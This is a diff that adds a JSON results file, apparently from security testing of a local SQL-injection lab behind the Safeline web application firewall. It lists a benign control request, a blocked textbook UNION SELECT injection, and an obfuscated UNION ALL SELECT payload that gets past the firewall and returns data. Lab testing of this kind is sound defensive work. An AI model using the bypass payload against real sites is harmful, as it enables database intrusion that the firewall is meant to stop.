@@ -1,0 +1,33 @@
+{
+  "base": "http://localhost:8888/Less-1/",
+  "all_passed": true,
+  "cases": [
+    {
+      "url": "http://localhost:8888/Less-1/?id=1",
+      "status": 200,
+      "len": 766,
+      "data_returned": true,
+      "case": "benign_control",
+      "expected_status": 200,
+      "note": "connectivity OK; not everything is blocked"
+    },
+    {
+      "url": "http://localhost:8888/Less-1/?id=1%27%20UNION%20SELECT%201,2,3--%20-",
+      "status": 403,
+      "len": 15347,
+      "data_returned": false,
+      "case": "naive_sqli_negctl",
+      "expected_status": 403,
+      "note": "Safeline active: textbook SQLi blocked"
+    },
+    {
+      "url": "http://localhost:8888/Less-1/?id=.1--+-%27/0+UNION+ALL+SELECT+1,CURRENT_DATE,3%27",
+      "status": 200,
+      "len": 812,
+      "data_returned": true,
+      "case": "manual_poc_bypass",
+      "expected_status": 200,
+      "note": "Safeline bypassable: crafted payload passes + returns data"
+    }
+  ]
+}
